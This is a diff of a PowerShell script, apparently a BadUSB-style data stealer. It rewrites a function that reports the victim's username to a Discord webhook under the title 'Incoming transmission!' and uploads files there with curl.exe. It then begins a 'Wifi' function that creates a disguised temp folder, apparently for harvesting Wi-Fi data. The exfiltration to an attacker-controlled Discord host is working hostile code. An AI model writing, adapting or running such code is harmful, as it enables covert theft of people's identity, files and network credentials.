@@ -20,47 +20,19 @@ param (
     [string]$text 
 )
 
-#Create embed array
-[System.Collections.ArrayList]$embedArray = @()
 
-#Store embed values
-$title       = 'Incoming transmission!'
-$description = '[' + $env:username + ']' + 'Little brother is reporting:'
-$color       = '16744960'
 
-#Create thumbnail object
-$thumbUrl = 'https://media.discordapp.net/attachments/1323765728448610354/1323778998551183422/VJXKxeX.png?ex=6775c0c3&is=67746f43&hm=a8a1b704ab855cf893e6ff652cebd862d761f107f0194f1c16c8c12a46be0538&=&format=webp&quality=lossless&width=157&height=91' 
-$thumbnailObject = [PSCustomObject]@{
-
-    url = $thumbUrl
-
+$Body = @{
+    title       = 'Incoming transmission!'
+    description = '[' + $env:username + ']' + 'Little brother is reporting:'
+    color       = '16744960'
 }
 
-#Create embed object, also adding thumbnail
-$embedObject = [PSCustomObject]@{
-
-    title       = $title
-    description = $description
-    color       = $color
-    thumbnail   = $thumbnailObject
-
-}
-
-#Add embed object to array
-$embedArray.Add($embedObject) | Out-Null
-
-#Create the payload
-$payload = [PSCustomObject]@{
-
-    embeds = $embedArray
-
-}
-}
 if (-not ([string]::IsNullOrEmpty($text))){
-#Send over payload, converting it to JSON
-Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'}
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
+}
 
 function Wifi {
 New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
